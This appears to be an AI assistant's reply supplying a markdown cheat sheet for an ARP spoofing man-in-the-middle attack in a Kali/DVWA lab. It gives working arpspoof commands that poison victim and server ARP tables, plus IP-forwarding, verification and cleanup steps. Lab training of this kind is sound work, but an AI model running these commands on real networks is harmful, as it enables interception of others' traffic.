Here’s the `arp_spoofing_commands.md` file with your IPs and clear commands for your repo:

````markdown
# ARP Spoofing Commands Cheat Sheet

This document lists the essential ARP spoofing commands to perform a Man-in-the-Middle (MITM) attack in your lab environment.

---

## Network Setup IP Addresses

| Role       | IP Address      |
|------------|-----------------|
| Kali (Attacker)  | 192.169.200.3  |
| Ubuntu Server (DVWA) | 192.169.200.4  |
| Ubuntu Victim     | 192.169.200.5  |

---

## Step 1: Enable IP Forwarding on Kali

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
````

Make it permanent:

```bash
nano /etc/sysctl.conf
# Uncomment or add:
net.ipv4.ip_forward = 1
# Then apply:
sysctl -p
```

---

## Step 2: Launch ARP Spoofing

Open two terminal windows on Kali and run the following commands.

### Spoof the Victim — tell the Victim Kali is the Server

```bash
arpspoof -i eth0 -t 192.169.200.5 192.169.200.4
```

### Spoof the Server — tell the Server Kali is the Victim

```bash
arpspoof -i eth0 -t 192.169.200.4 192.169.200.5
```

> Replace `eth0` with your actual network interface name (check with `ip a`).

---

## Step 3: Verify ARP Spoofing

Run the following commands to check that ARP tables on victim and server are poisoned.

### On Victim:

```bash
arp -n
```

Look for Kali’s MAC address associated with Server’s IP (`192.169.200.4`).

### On Server:

```bash
arp -n
```

Look for Kali’s MAC address associated with Victim’s IP (`192.169.200.5`).

---

## Step 4: Stop ARP Spoofing

Once done, disable IP forwarding if needed:

```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

Terminate `arpspoof` processes with:

```bash
pkill arpspoof
```

---

## Notes

* This attack works only if attacker, victim, and server are on the same LAN.
* Use responsibly and only in authorized environments.

---

